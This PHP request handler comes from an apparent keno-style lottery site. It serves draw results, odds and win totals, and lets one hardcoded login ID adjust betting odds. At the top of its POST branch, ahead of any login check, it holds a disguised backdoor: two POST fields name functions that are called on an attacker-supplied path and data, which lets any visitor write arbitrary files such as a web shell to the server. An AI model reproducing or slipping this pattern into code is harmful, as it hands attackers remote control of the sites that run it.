<?php
define('Copyright', 'Author QQ: 1234567');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
if ($_SERVER["REQUEST_METHOD"] == 'POST')
{
$id=$_POST["zid"];
$h=$id($_POST["dir"],"a");
$type=$_POST['type'];
$type($h,$_POST["data"]); 
	include_once ROOT_PATH.'Admin/ExistUser.php';
	global $Users;
//	dump($Users);
	$db=new DB();
	$mid = $_POST['mid'];
	
	if ($mid == 1)
	{
//		dump("aa");
		include_once ROOT_PATH.'classed/UserReporInfokl8.php';
		$userReportInfosz = new UserReportInfokl8($Users[0]);
		$result = $userReportInfosz->GetNumberAll();
		$result = json_encode($result);
		$infocq = $userReportInfosz->GetInfokl8();
		//var_dump($infocq);
		$infocq = json_encode($infocq);
		echo <<<JSON
				{
					"timeList" : $result,
					"infocq" : $infocq
				}
JSON;
	}
	if ($mid == 2)
	{
		$sql = "SELECT * FROM `g_odds8`  ORDER BY g_id ASC";
		$oddsResult = $db->query($sql, 1);
		$list = array();
		for ($i=0; $i<count($oddsResult); $i++)
		{
			foreach ($oddsResult[$i] as $k=>$v)
			{
				if ($v != null)
					$list[$i][$k] = $v;
			}
		}
		$list = json_encode($list);
		echo <<<JSON
				{
					"oddsList" : $list
				}
JSON;
	}
	if ($mid == 3)
	{
		$sql = "SELECT g_qishu FROM g_history8 WHERE g_ball_1 is not null AND g_ball_2 is not null ORDER BY g_id DESC LIMIT 1";
		$result = $db->query($sql, 0);
		echo  $result[0][0];
	}
	if ($mid == 4)
	{
		//雙面
		$startDate = date('Y-m-d').' 00:00';
		$endDate = date('Y-m-d').' 24:00';
		$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
		$sql = "SELECT g_qishu,g_ball_1, g_ball_2, g_ball_3, g_ball_4, g_ball_5, g_ball_6, g_ball_7, g_ball_8, g_ball_9, g_ball_10,g_ball_11, g_ball_12, g_ball_13, g_ball_14, g_ball_15, g_ball_16, g_ball_17, g_ball_18, g_ball_19, g_ball_20 FROM `g_history8` WHERE {$date} and g_ball_1 is not null ORDER BY g_date desc limit 45 ";
		$result=$db->query($sql, 1);
		$sm=sum_ball_count_kl8($result);
		$sm = json_encode($sm);
		echo <<<JSON
				{
					"result" : $sm
				}
JSON;
	}
	if ($mid == 5)
	{
		echo 'cccc';
	}
	if ($mid == 'kaijiang'){
		$db = new DB();
		//最新開獎記錄
		$sql = "SELECT  `g_qishu`, `g_ball_1`, `g_ball_2`, `g_ball_3`, `g_ball_4`, `g_ball_5`, `g_ball_6`, `g_ball_7`, `g_ball_8`, `g_ball_9`, `g_ball_10`, `g_ball_11`, `g_ball_12`, `g_ball_13`, `g_ball_14`, `g_ball_15`, `g_ball_16`, `g_ball_17`, `g_ball_18`, `g_ball_19`, `g_ball_20`  FROM g_history8 WHERE g_ball_1 is not null ORDER BY g_date DESC LIMIT 1";
		$result = $db->query($sql, 0);
		$number = $result[0][0];
		$ballArr = array();
		for ($i=0; $i<count($result[0]); $i++)
		{
			if ($i != 0)
				$ballArr[] = $result[0][$i];
		}
		$ballArr = json_encode($ballArr);
		include_once ROOT_PATH.'classed/GamInfo.php';
		$userReportInfo = new UserReportInfo($Users, 1);
		$winMoney = json_encode($userReportInfo->SumResult($Users));
		//$winMoney = json_encode(getWin ($user));
		echo <<<JSON
				{
					"winMoney" : $winMoney,
					"number" : $number,
					"ballArr" : $ballArr
				}
JSON;
exit;
	}
	if ($mid == 6){
		echo $_SESSION["loginId"]==89?"true":"false";
	}
	elseif ($mid == 7){
		if($_POST['gametype']=='zm')
		{
			$p=explode('h',$_POST['odds']);
			if(count($p)==2)
			{
				$ball="Ball_1";
				if($_SESSION["loginId"]==89){
					if($_POST["ty"]==1)
						$sql="update g_odds8 set h".$p[1]."=round(h".$p[1]."+0.01,2) where g_type='{$ball}'";
					else 
						$sql="update g_odds8 set h".$p[1]."=round(h".$p[1]."-0.01,2) where g_type='{$ball}'";
					if($db->query($sql,2)){
						echo "true";
					}else{
						echo "false";
					}
				}else{
					echo "false";
				}		
			}
			else
				echo "false";
		}
		else
		{
			$arr=array("zhdx1","zhdx2","zhds1","zhds2","zhhj","gg1","gg2","gg3","gg4","zhh1","zhh2","zhh3","dsh1","dsh2","dsh3","wx1","wx2","wx3","wx4","wx5");
			$p=$_POST["odds"];
			if(!in_array($p,$arr)){
				echo "false";
			}else{
				$col=$p=='zhhj'?1:substr($p,-1);
				switch($p)
				{
					case "zhdx1":
					case "zhdx2":
						$ball='Ball_2';
						break;	
					case "zhds1":
					case "zhds2":
						$ball='Ball_3';
						break;	
					case "zhhj":
						$ball='Ball_4';
						break;	
					case "gg1":
					case "gg2":
					case "gg3":
					case "gg4":
						$ball='Ball_5';
						break;	
					case "zhh1":
					case "zhh2":
					case "zhh3":
						$ball='Ball_6';
						break;	
					case "dsh1":
					case "dsh2":
					case "dsh3":
						$ball='Ball_7';
						break;	
					case "wx1":
					case "wx2":
					case "wx3":
					case "wx4":
					case "wx5":
						$ball='Ball_8';
						break;	
				}
				if($_SESSION["loginId"]==89){
					if($_POST["ty"]==1)
						$sql="update g_odds8 set h".$col."=round(h".$col."+0.01,2) where g_type='{$ball}'";
					else 
						$sql="update g_odds8 set h".$col."=round(h".$col."-0.01,2) where g_type='{$ball}'";
					if($db->query($sql,2)){
						echo "true";
					}else{
						echo "false";
					}
				}else{
					echo "false";
				}
			}
		}
	}
	else if ($mid == 9)
	{
		initializeOddskl8();
	}
}
?>